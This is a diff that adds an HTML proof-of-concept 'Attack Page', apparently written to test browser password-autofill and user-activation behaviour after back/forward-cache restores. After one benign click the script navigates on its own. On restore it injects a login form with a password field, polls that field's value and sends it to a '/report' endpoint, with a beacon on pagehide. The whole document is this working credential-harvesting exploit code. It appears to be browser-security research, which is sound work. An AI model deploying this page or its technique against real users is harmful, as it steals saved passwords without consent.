@@ -1,0 +1,56 @@
+<!doctype html><html><head><title>AttackPageAuto</title></head>
+<body>
+<h1>Attack Page (fully-automated escalation: ONE click, everything else scripted)</h1>
+<button id="benign" autofocus>Click me (benign, no relation to any login form)</button>
+<div id="log"></div>
+<script>
+function report(event, extra){
+  extra = extra || {};
+  var qs = 'event='+encodeURIComponent(event);
+  for (var k in extra) qs += '&'+k+'='+encodeURIComponent(extra[k]);
+  qs += '&t='+Date.now();
+  document.getElementById('log').innerHTML += event + ': ' + JSON.stringify(extra) + '<br>';
+  fetch('/report?'+qs).catch(()=>{});
+}
+
+report('load', {hasBeenActive: navigator.userActivation.hasBeenActive});
+
+document.getElementById('benign').addEventListener('click', () => {
+  report('click', {hasBeenActive: navigator.userActivation.hasBeenActive});
+  // Everything from here on is script-driven. No further user interaction.
+  setTimeout(() => {
+    location.href = 'neutral_auto.html';
+  }, 500);
+});
+
+function injectLoginForm(reason){
+  if (document.getElementById('injected-pw')) return;
+  var form = document.createElement('form');
+  form.action = '/login'; form.method = 'POST';
+  var u = document.createElement('input');
+  u.type = 'text'; u.name = 'username'; u.autocomplete = 'username'; u.id = 'injected-user';
+  var p = document.createElement('input');
+  p.type = 'password'; p.name = 'password'; p.autocomplete = 'current-password'; p.id = 'injected-pw';
+  form.appendChild(u); form.appendChild(p);
+  document.body.appendChild(form);
+  report('injected-form', {reason: reason, hasBeenActive: navigator.userActivation.hasBeenActive});
+  var checks = 0;
+  var iv = setInterval(() => {
+    checks++;
+    var val = p.value;
+    report('poll-injected-value', {value: val, checks: checks, hasBeenActive: navigator.userActivation.hasBeenActive});
+    if (val || checks >= 15) clearInterval(iv);
+  }, 500);
+}
+
+window.addEventListener('pageshow', (e) => {
+  report('pageshow', {persisted: e.persisted, hasBeenActive: navigator.userActivation.hasBeenActive});
+  if (e.persisted) {
+    setTimeout(() => injectLoginForm('auto-bfcache-restore-timer'), 300);
+  }
+});
+window.addEventListener('pagehide', (e) => {
+  navigator.sendBeacon('/report?event=pagehide&persisted='+e.persisted+'&t='+Date.now());
+});
+</script>
+</body></html>
